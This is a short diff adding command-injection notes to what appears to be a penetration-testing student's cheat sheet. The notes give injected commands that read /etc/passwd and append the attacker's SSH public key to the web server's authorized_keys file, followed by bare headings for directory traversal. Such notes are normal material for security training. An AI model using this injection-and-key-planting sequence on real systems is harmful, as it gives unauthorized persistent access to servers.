@@ -16,3 +16,18 @@ lin_ops# firefox                                                                
 NMAP SCRIPTS
   /usr/share/nmap/scripts
 smb-os-discovery
+
+COMMAND INJECTION
+Begin all new commands with a ;
+UPLOAD SSH KEY TO WEB SERVER:
+  ; whoami                                                #FIND OUT WHO YOU ARE
+  ; cat /etc/passwd                                       #FIND HOME DIRECTORY
+  ssh-keygen                                              #CREATE SSH KEY
+  cat /home/student/.ssh/id_rsa.pub                       #LOOK AT SSH KEY
+  ; mkdir /var/www/.ssh                                   #MAKE .ssh directory
+  ; echo "COPIED KEY" >> /var/www/.ssh/authorized_keys    #ECHO YOUR KEY INTO THE .ssh DIRECTORY
+
+Directory Traversal VIA
+URL
+FILE SEARCHING
+CALL A FUNCTION USING THE DEV TOOLS CONSOLE ()
